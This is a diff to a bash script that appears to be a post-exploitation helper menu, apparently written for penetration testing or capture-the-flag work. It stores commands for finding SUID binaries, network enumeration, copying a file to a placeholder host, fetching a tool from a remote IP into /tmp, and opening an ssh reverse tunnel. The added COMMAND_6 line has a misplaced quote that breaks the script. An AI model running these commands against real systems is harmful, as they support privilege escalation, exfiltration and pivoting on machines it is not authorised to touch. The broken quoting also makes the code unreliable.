@@ -1,9 +1,11 @@
 #! /bin/bash
 
 COMMAND_1='find / -perm -u=s -type f 2>/dev/null'
-COMMAND_2='ss -tulpn'
-COMMAND_3='scp FILE_TO_SEND L_H_O_S_T'
-COMMAND_4='wget -O /tmp/ http://10.9.233.39:8000/[TOOL]'
+COMMAND_2='arp -a'
+COMMAND_3='ss -tulpn'
+COMMAND_4='scp FILE_TO_SEND L_H_O_S_T'
+COMMAND_5='wget -O /tmp/ http://10.9.233.39:8000/[TOOL]'
+COMMAND_6='ssh -R 8000:172.16.0.1:80 frog@172.16.0.2' -i id_rsa -fN'
 
 show_menus() {
   clear
